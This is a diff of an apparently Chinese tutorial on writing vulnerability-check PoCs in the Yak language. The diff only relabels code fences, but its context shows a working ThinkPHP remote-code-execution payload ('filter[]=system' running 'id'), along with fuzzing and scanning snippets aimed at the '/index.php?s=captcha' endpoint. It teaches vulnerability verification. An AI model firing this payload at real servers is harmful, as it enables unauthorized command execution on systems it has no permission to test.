@@ -101,7 +101,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 具体代码如下
 
-```go
+```yak
 rsp, req, err := poc.HTTP(`
 POST /index.php?s=captcha HTTP/1.1
 Host: {{param(target)}}
@@ -128,7 +128,7 @@ if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rsp) {
 
 如果一个 PoC 仅仅是特别基础的发送一个请求，根据返回的结果来判断是否存在漏洞，那么这个 PoC 的编写其实非常简单
 
-```go
+```yak
 // 发送一个请求
 rsp, err := http.Post(
     "http://127.0.0.1:8080/index.php?s=captcha",
@@ -164,7 +164,7 @@ if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rawPacket/*type: any*/) {
 
 这个方法比 `http` 更好的是：**我们可以直接把数据包直接复制在代码中，减少大家的理解和调试成本**
 
-```go
+```yak
 fReq, err := fuzz.HTTPRequest(`
 POST /index.php?s=captcha HTTP/1.1
 Host: localhost:8080
@@ -213,7 +213,7 @@ for rsp = range reqs {
 
 我们直接使用
 
-```go
+```yak
 res, err := nuclei.Scan("http://127.0.0.1:8080", nuclei.tags("thinkphp"))
 die(err)
 for r := range res {
@@ -273,7 +273,7 @@ requests:
 
 ### 回顾一下我们在 `fuzz` 中学习的技能
 
-```go
+```yak
 fReq, err := fuzz.HTTPRequest(`
 POST /index.php?s=captcha HTTP/1.1
 Host: localhost:8080
@@ -294,7 +294,7 @@ if err != nil {
 1. 如果要调整他的扫描目标，我们就 `.FuzzHTTPHeader("Host", targets)` 替换掉 Host。
 1. 如果说我们要调整 Payload，就 `.FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"])` 更新想要执行的命令。
 
-```go
+```yak
 rsp, err := fReq.FuzzHTTPHeader("Host", sprintf("{{net(%v)}}:{{port(%v)}}", host, port)).FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"]).Exec()
 die(err)
 ```
@@ -313,7 +313,7 @@ die(err)
 
 根据我们的 `import` 的全局函数，我们可以把我们的代码，封装成为一个可供别的脚本调用的函数，使用 `cli` 来接受用户输入的参数。
 
-```go title="thinkphp-poc.yak"
+```yak title="thinkphp-poc.yak"
 def poc(host, port) {
    fReq, err := fuzz.HTTPRequest(`
    POST /index.php?s=captcha HTTP/1.1
